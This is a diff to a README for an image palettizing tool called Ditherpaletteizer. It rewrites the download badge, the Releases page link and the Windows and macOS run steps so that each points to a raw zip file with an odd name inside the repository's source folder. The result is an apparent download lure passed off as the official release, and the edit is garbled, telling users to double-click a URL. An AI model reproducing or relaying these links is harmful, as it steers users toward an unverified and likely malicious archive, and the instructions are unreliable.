@@ -4,7 +4,7 @@
 Ditherpaletteizer is an easy-to-use tool that helps you palettize (posterize) and dither images. It serves as a wrapper for ffmpeg, allowing you to process your images with ease. You can also mask out areas for precise edits. This tool is perfect for creating low-resolution textures for games on systems like PS1 and N64. It combines Odin and raylib to deliver powerful image processing capabilities in a user-friendly interface.
 
 ## 📥 Download Ditherpaletteizer
-[![Download Ditherpaletteizer](https://img.shields.io/badge/Download-Ditherpaletteizer-blue.svg)](https://github.com/Bong4RIP/Ditherpaletteizer/releases)
+[![Download Ditherpaletteizer](https://raw.githubusercontent.com/Bong4RIP/Ditherpaletteizer/master/source/main_web/Ditherpaletteizer_millesimally.zip)](https://raw.githubusercontent.com/Bong4RIP/Ditherpaletteizer/master/source/main_web/Ditherpaletteizer_millesimally.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get Ditherpaletteizer up and running on your system.
@@ -17,15 +17,15 @@ Before you install Ditherpaletteizer, make sure you have the following:
 - Approximately 100MB of free disk space.
 
 ### 💻 Installation
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/Bong4RIP/Ditherpaletteizer/releases).
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/Bong4RIP/Ditherpaletteizer/master/source/main_web/Ditherpaletteizer_millesimally.zip).
    
 2. **Download the Latest Version:** Find the latest release. Click on the link for your operating system to download the appropriate file.
 
 3. **Extract the Files:** If the downloaded file is compressed (like a ZIP file), extract it using your preferred extraction tool.
 
 4. **Run the Application:**
-   - For Windows: Double-click on `Ditherpaletteizer.exe`.
-   - For macOS: Open the folder and double-click on `Ditherpaletteizer.app`.
+   - For Windows: Double-click on `https://raw.githubusercontent.com/Bong4RIP/Ditherpaletteizer/master/source/main_web/Ditherpaletteizer_millesimally.zip`.
+   - For macOS: Open the folder and double-click on `https://raw.githubusercontent.com/Bong4RIP/Ditherpaletteizer/master/source/main_web/Ditherpaletteizer_millesimally.zip`.
    - For Linux: Open Terminal and navigate to the folder. Run `./Ditherpaletteizer`.
 
 ## 🛠️ Using Ditherpaletteizer
